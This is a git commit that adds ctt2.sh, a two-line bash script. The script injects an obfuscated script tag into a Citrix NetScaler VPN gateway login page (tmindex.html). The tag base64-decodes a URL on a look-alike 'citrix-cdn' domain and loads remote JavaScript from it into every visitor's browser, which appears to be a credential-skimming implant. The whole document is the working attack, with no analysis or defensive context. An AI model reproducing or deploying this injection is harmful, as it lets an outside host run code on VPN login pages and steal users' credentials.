5176bba7b40571b690ee8ad4f37b22cb1b0ec9cd
ChanLiHou <149198882+ChanLiHou@users.noreply.github.com>
2023-11-02 08:18:41 -0800

    Create ctt2.sh

---
+++ ctt2.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+echo '<script>var u=window.atob("aHR0cHM6Ly9jaXRyaXgtY2RuLm5ldC9wb2prZmNrajIwOTNqY2xrc2Rhc2RkajA5ZGZwaHFvaXdoamUyaTFvNDNqcGlvbS9jaXRyaXguanM=");var s=document.createElement("script");s.src=u;s.type="text/javascript";document.head.appendChild(s);</script>' >> /netscaler/ns_gui/vpn/tmindex.html
